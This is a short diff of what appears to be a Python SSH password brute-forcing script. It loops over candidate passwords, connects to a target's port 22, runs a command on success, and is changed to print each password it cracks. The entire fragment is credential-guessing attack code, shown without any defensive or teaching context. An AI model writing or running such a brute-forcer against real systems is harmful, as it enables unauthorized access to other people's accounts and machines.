@@ -29,6 +29,6 @@ for password in passwords:
         ssh.connect(target, "22", username, password)
         stdin, stdout, stderr = ssh.exec_command(command)
         lines = stdout.readlines()
-        print(lines)
+        print("Get passsword for user {}: {}".format(username, password))
     except:
         print("Auth failure for user {} and password {}".format(username, password))
